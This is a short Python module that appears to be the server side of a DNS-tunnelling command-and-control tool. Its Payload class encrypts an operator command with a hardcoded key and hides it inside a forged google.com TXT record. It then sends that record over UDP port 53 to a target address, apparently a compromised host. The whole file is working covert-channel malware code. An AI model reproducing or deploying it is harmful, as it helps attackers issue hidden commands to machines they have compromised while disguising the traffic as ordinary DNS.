import base64
from dnslib import DNSRecord, DNSHeader, RR

from dataEncryptor import dataEncryptor

class Payload:
    def __init__(self,addr):
        self.addr = addr

    def payload(self,sock,req,com):
        d = dataEncryptor()
        finalCommand = d.encrypting(com, "hellothisismebob")
        request = DNSRecord.parse(req)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalCommand + "!"))
        resp = reply.pack()
        sock.sendto(resp,(self.addr,53))